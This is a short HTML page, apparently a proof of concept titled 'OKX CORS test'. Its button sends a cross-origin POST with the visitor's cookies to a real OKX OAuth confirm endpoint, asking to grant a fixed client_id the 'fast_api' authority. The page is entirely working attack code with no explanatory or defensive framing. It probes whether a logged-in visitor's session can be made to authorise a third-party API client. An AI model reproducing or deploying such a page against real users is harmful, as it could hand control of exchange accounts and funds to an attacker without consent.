<!doctype html>
<html>
<body>
<h2>OKX CORS test</h2>
<button onclick="test()">Test</button>
<pre id="out"></pre>

<script>
async function test() {
  try {
    const r = await fetch("https://www.okx.com/v3/users/oauth/confirm?t=1789938393698", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        client_id: "3fe1ee51d88a4c1cab8694faf7752e95Q2XtBWdH",
        authority: "fast_api"
      })
    });

    document.getElementById("out").textContent =
      "status = " + r.status + "\n\n" + await r.text();

  } catch (e) {
    document.getElementById("out").textContent =
      "CORS/Fetch error:\n" + e;
  }
}
</script>
</body>
</html>
